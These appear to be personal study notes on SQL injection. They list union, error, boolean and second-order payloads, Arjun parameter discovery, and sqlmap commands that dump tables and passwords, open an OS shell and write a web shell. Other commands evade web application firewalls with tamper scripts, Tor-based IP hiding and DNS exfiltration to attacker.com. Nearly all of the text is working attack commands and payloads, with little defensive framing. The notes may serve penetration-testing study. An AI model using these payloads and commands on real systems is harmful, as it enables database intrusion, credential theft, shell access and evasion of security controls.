Look for input fields and URLs that have parameters
- username = Ahmed , Password = 12345
- -> username = Ahmed' --   || Ahmed'; -- 
- -> username=' OR 1=1 --   || ' OR 1=1; --

### UNION-based Attack
`password = pass123' UNION SELECT username, passwird FROM Users;--`
### ORDER BY
The `ORDER BY` clause is often used in **SQL Injection (SQLi) attacks** to determine the number of columns in the database table before performing **UNION-based SQL Injection**.
```sql
http://example.com/products?category=1 ORDER BY 1-- 
http://example.com/products?category=1 ORDER BY 2-- 
http://example.com/products?category=1 ORDER BY 3-- 
http://example.com/products?category=1 ORDER BY 4--  (Error)

```
then the number of columns of 3.
```sql
http://example.com/products?category=1 UNION SELECT 1,2,3--
```

--------------------------------
## Extracting Table Names Across All Databases

```sql
UNION SELECT 1, (SELECT table_name FROM information_schema.tables LIMIT 8,1), 3-- -
```
 - `LIMIT` **is required** to fetch a **specific row**.
- Without `LIMIT`, you would get **all table names at once**, which may cause errors.
> what if i wrote 1 column? If the original query expects **3 columns**, this will fail because **only 1 column** (`table_name`) is selected.
    The `UNION` operator requires the **same number of columns** in both queries.(The **original SELECT statement**)

## Extracting Tables in the Current Database
```sql
UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 7,1),3-- -
```
## Extracting Column Names of a Specific Table
```sql
UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 3,1),3-- -
```


### Error-based attack
```password = pass123' UNION SELECT 1, CONVERT ((SELECT Password FROM Users WHERE Username="admin"), DATE);--```

```sql
IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)
```

```sql
' AND 1=CONVERT(INT, (SELECT @@version));--
```

```sql
' AND EXTRACTVALUE(1, CONCAT(0x0a, @@version));--
```

### Boolean-based attack
`password= pass123' UNION SELECT Id FROM Users WHERE Username = 'admin' and SUBSTR(Password,1,1) = 'a' ;--`
if it returns data then you now have the id and brute force over the password to get it too
or we can use RLIKE : `RLIKE "(^)[a].*";`
```sql
' OR 1=1 --  (Always True) ✅
' OR 1=2 --  (Always False) ❌
```
If the first query returns a different response than the second, the application is vulnerable!
### Second-order SQL attack
When user input gets stored into a database, then retrieved and used unsafely in a SQL query. Even if the application handles the input properly when it's submitted by the user but the application deals with the data that came from the database as safe.
**how to exploit them** :
let's say we will try on the username.
- make the username like : `"ma133' UNION SELECT username, passwird FROM Users;--"`
- then try to access an end point where the application retrieve the username form it's database 
# Arjun
designed to discover **HTTP parameters**
`arjun -u "http://example.com/page.php"`
`arjun -u "http://example.com/page.php" -m POST` > **Specify HTTP method (GET/POST)**
`arjun -u "http://example.com/page.php" -H "Cookie: session=1234"` > **Include headers (e.g., cookies or authorization tokens)**
`arjun -u "http://example.com/page.php" -w /path/to/wordlist.txt` > **Use a custom wordlist**
`arjun -u "http://example.com/api" -j '{"key":"value"}'` > **Test for parameters in JSON data (for APIs)**
JSON should be in POST request > right click + change request method + edit content type and write `application/json` + add JSON in the body; eg: { "id" : 1}
and then delete 1 and add * and send it to sqlmap
# SQLMAP
`sqlmap -u <target_url>`
`sqlmap -u <target_url_?offset=1> -p offset`
`sqlmap -r file.txt` > put * 
 `sqlmap -u "http://example.com/page.php" --data="id=1" --method=POST` > **Specify HTTP method (GET/POST)** 
 `sqlmap sqlmap.py -u http://example.com/login --data="username=admin&password=pass123"`
 The output of this command should be used in the HTTP request body using burp suite
### examples on POST Requests:
 - **User Login Form**
 - **Search Function** > `sqlmap.py -u http://example.com/login --data="query=test"`
 - **Feedback Submission** 
 `sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=1234"` > **Specify cookies for authentication** 
 or > `sqlmap -u "http://example.com/page.php" -H "Cookie:id=*"` , `sqlmap -u "http://example.com/page.php" -H "Cookie:*"` *or any header no just cookie*
 `sqlmap -u "http://example.com/page.php?id=1" -v 6` , `sqlmap -u "http://example.com/page.php?id-1" --level 5 --risk 3` > **Increase verbosity**
 `sqlmap -u "http://example.com/page.php?id=1" --dbs` > If the target is vulnerable, `sqlmap` will attempt to retrieve a list of all databases available on the database server.
 `sqlmap -u "http://example.com/page.php?id=1" -D <database_name> --tables` > **Enumerate tables in a specific database**
 `sqlmap -u "http://example.com/page.php?id=1" -D <database_name> -T <table_name> --dump` > **Dump data from a specific table**
 `sqlmap -u "http://example.com/page.php?id=1" --dump-all` > **dump all data** **from the target database** 
 `sqlmap -u "http://example.com/app.php?id=10" -p id --dbms=PostgreSQL --dump --tables -T users --columns -C username,password --batch --headers="X-Forwarded-For: 127.0.0.1\nAuth-Token: abcdef12345"` :
 - `--dump`: Dumps database content.
- `--tables`: Lists tables to identify which ones to target.
- `-T users`: Targets the 'users' table specifically.
- `--columns`: Lists columns of the specified table.
- `-C username,password`: Specifies the columns to extract data from.
- `--headers="X-Forwarded-For: 127.0.0.1\nAuth-Token: abcdef12345"`: Includes custom HTTP headers necessary for maintaining sessions or access controls that require specific tokens or client IP forwarding.

if it's not working try encode it > ctrl + u
![[Pasted image 20250322164625.png]]
# SQLMAP Techniques : 
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries
to use all => `--technique=BEUSTQ`, or u can just write any letter of them
------------------------------------------
- SQLMap can **identify** the OS and database details to **prepare for privilege escalation**.
`sqlmap -u "http://example.com/index.php?id=1" --current-user --current-db --hostname --is-dba` > if `is-dba` returns **True**, you have **database admin privileges**
- If the database has high privileges, SQLMap can **execute system commands**.
`sqlmap -u "http://example.com/index.php?id=1" --os-shell` > This gives you **command-line access** if possible.
- If the database user has **high privileges**, you can try escalating control.
`sqlmap -u "http://example.com/index.php?id=1" --privileges` > If you see `FILE`, `EXECUTE`, or `SUPER`, you can **read/write files**.
**Try Writing a Web Shell**:
`sqlmap -u "http://example.com/index.php?id=1" --file-write="/var/www/html/shell.php" --file-dest="/var/www/html/shell.php"` >Now, access your **webshell** at `http://example.com/shell.php`.
- `sqlmap.py -m /path/to/targets.txt` > Allows testing of multiple targets listed in a text file. Each line in the file should contain one target.
- `sqlmap.py -g "inurl:index.php?id="y` > Uses Google dorking to find and process target URLs. SQLMap automates the search for URLs using specified Google dorks.
- 
# Tampering
Tampering in SQLMap refers to **modifying or obfuscating SQL injection payloads** to bypass security mechanisms such as **Web Application Firewalls (WAFs), Intrusion Detection Systems (IDS), or filters**.
SQLMap provides **tamper scripts** that can be applied using the `--tamper` option to **alter the payload structure**, making it harder for security tools to detect and block the attack.
``sqlmap --list-tampers`` > To list all available tamper scripts
## Common Tamper Scripts
`sqlmap -u "http://example.com/login.php?id=1" --dbs --tamper=space2comment,randomcase,charencode`
**space2comment.py** :
- Replaces spaces with comments (`/**/`) to evade WAFs.
- `SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM users;` will be: `SELECT/**//*FROM/**/users/**/WHERE/**/id/**/=/**/1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users;`
**randomcase.py** :
- Randomizes the case of SQL keywords to bypass case-sensitive filters.
**charencode.py** :
- Encodes SQL characters into their **CHAR()** equivalent to avoid detection.
**base64encode.py** :
- Encodes payloads in **Base64** and decodes them at runtime.
**between.py** :
- Replaces `=` with `BETWEEN` to avoid simple WAF rules.

# How to Identify and Bypass a Firewall (WAF)
## WafW00f
`wafw00f http://example.com` > output :
`Target: http://example.com
`Detected WAF: Cloudflare`

## Bypassing the Firewall (WAF)
### Using SQLMap with Tamper Scripts
`sqlmap -u "http://example.com/index.php?id=1" --dbs --tamper=space2comment,randomcase,charencode`
- **Works well against** ModSecurity, Cloudflare, and generic WAFs.
### Using HTTP Parameter Pollution
`sqlmap -u "http://example.com/index.php?id=1&id=2" --dbs`
- Some WAFs filter `id` but not multiple parameters.
### Bypassing WAF Using Out-of-Band (OOB) Attacks
Some WAFs block inline responses but may allow **DNS exfiltration**.  
Use **OOB techniques** to extract data: `sqlmap -u "http://example.com/index.php?id=1" --dbs --dns-domain=attacker.com`
### IP Spoofing
Some WAFs block **specific IPs**. Use **TOR & ProxyChains** to change IP.
`sudo apt install tor proxychains4 -y`
`sudo service tor start`
`proxychains sqlmap -u "http://example.com/index.php?id=1" --dbs`

- `--hex`: Encodes payloads in hexadecimal format, another method to bypass WAF filters.
- `--delay=2`: Delays between each request to avoid triggering rate limits or suspicious activity alerts.
**alternatives to 1=1** :
```sql
index.php?id=1+OR+1=repeat(1,1)--
```

```sql
/index.php?id=1+OR+1=insert(1,1,1,1)--
```

```sql
/index.php?id=1+OR+1=replace(1,1,1)--
```

```sql
/index.php?id=1+OR+1=right(1,1)--
```

```sql
/index.php?id=1+OR+replace(insert(1,1,1,1),1,1)=repeat(1,1)--
```


```sql
SELECT login FROM users WHERE id={`foo`/*bar*/(SELECT 2)};
```
- This works **because WAF might not recognize** `(SELECT 2)` inside `{}`.
```sql
SELECT login FROM users WHERE id=sEleCt/*foo*/1;
```

**using subqueries to bypass WAF** :
```sql
UNION SELECT user, password FROM users
-- blocked
```

```sql
1 || (SELECT user FROM users WHERE user_id = 1) = 'admin'
-- bypass
```

```sql
1 || (SELECT user FROM users WHERE user_id = 6) = 'admin'
-- blocked
```

```sql
1 || (SELECT user FROM users LIMIT 1 OFFSET 5) = 'admin'
-- bypass
```

```sql
1 || (SELECT user FROM users GROUP BY id HAVING id=6) = 'admin'
--bypass
```

**Using `-` to manipulate conditions**:
```sql
SELECT * FROM users WHERE name = 0-0;
```

**try modifying some parameters** :
```sql
User-Agent: ' OR 1=1;--
```


------------------------------------------------

`--random-agent` > to avoid blocking
`--referer="Google"` > same as above
`--drop-set-cookie` > to avoid sending cookie
`--ignore-code <no of code>` > to avoid the error codes 

